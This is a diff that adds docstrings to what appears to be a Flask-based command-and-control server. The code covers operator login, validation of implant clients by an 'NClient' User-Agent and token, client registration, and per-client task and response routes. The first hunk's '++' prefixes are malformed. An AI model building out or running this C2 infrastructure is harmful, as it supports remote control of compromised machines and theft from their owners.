@@ -116,15 +116,18 @@ def valid_login(username:str, passw:str) -> bool:
         return False
 
 def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
-    """Add a user to the database
-
-    Args:
-        username (str): The username of the account to add
-        passw (str): The password of the account to add
-
-    Returns:
-        str: If the account was created successfully or not
     """
++    Add a user to the database.
++
++    Args:
++        username (str): The username of the account to add.
++        passw (str): The password of the account to add.
++        isAdmin (bool, optional): Whether the account should have admin privileges.
++            Defaults to False.
++
++    Returns:
++        str: A message indicating whether the account was created successfully.
++    """
     if not username or not passw: return "All fields are required"
     user = User.query.get(username)
     if user: return "An account with this username already exists"
@@ -167,6 +170,18 @@ def stylesheel():
 
 @app.route('/login', methods=['POST', 'GET'])
 def loginPage():
+    """
+    This function is the handler for the '/login' endpoint, which is accessed via both POST and GET methods.
+    It renders the 'logIn.html' template and passes the 'error' variable to it.
+
+    Args:
+        None
+
+    Returns:
+        If the request method is POST and the login credentials are valid, it redirects to the 'overviewPage'.
+        If the user is remembered (i.e., logged in previously), it redirects to the 'overviewPage'.
+        Otherwise, it renders the 'logIn.html' template with the 'error' variable.
+    """
     error = None
     if flask.request.method == 'POST':
         if valid_login(flask.request.form['username'],
@@ -187,11 +202,15 @@ def loginPage():
         user = flask.request.form['username']
     except KeyError:
         user = ""
-    return flask.render_template('logIn.html', user = user, error = error)
+    return flask.render_template('logIn.html', error = error)
 
 @app.route('/logout')
 @flask_login.login_required
 def logoutPage():
+    """
+    Logs out the current user by setting authenticated to False, committing the change to the database, and logging out the user. 
+    Returns the rendered 'logOut.html' template.
+    """
     user = User.query.get(flask_login.current_user.username)
     user.authenticated = False#might not need ths due to flask_login.logout_user
     db.session.commit()
@@ -226,6 +245,10 @@ def clientsPage():
 
 #C2 interface
 def validateC2Client(request:flask.request) -> bool:
+    """
+    This function validates the C2 client by checking the request headers and decoding the NClient-Token. 
+    It returns a boolean value indicating whether the client is valid or not.
+    """
     try:
         if request.headers['User-Agent'].split()[0] != 'NClient': return False
         cToken = request.headers['NClient-Token']
@@ -244,6 +267,10 @@ def validateC2Client(request:flask.request) -> bool:
         return False
 
 def generateRandPath() -> str:
+    """
+    A function that generates a random path of length 12 consisting of alphanumeric characters.
+    Returns: str
+    """
     x = ""
     for y in range(12):
         x += secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
@@ -251,6 +278,11 @@ def generateRandPath() -> str:
 
 @app.route('/contact')
 def contactC2Page():
+    """
+    A route for the contact page. Validates the C2 client, decodes the JWT, generates random paths, 
+    and adds a new client to the database if it doesn't exist. Otherwise, retrieves the paths from 
+    the existing client. Finally, it returns a response with the paths in the headers.
+    """
     if not validateC2Client(flask.request): return not_found('Invalid')
     jwT = flask.request.headers['NClient-Token']
     if not Device.query.filter_by(jwt=jwT).all():
@@ -271,6 +303,16 @@ def contactC2Page():
 
 @app.route('/c/<c2ID>/<pName>', methods=["GET", "POST"])
 def instructReponsePages(c2ID:str, pName:str):
+    """
+    This function handles the response from a C2 client.
+
+    Args:
+        c2ID (str): The unique ID of the C2 client.
+        pName (str): The name of the page (task or response).
+
+    Returns:
+        str or flask.Redirect: The response to be sent back to the C2 client.
+    """
     if not validateC2Client(flask.request): return not_found("Invalid")
     jwT = flask.request.headers['NClient-Token']
     try:
@@ -311,6 +353,15 @@ def instructReponsePages(c2ID:str, pName:str):
 
 #Run forever
 def start_server(port:int):
+    """
+    Start a server on the specified port.
+
+    Args:
+        port (int): The port number on which the server will listen.
+
+    Returns:
+        None
+    """
     server = wsgi.Server(listen(('0.0.0.0', port)), '127.0.0.1', app=app)
     print(f"Web server running on http://127.0.0.1:{str(port)}/")
     print(server.address)
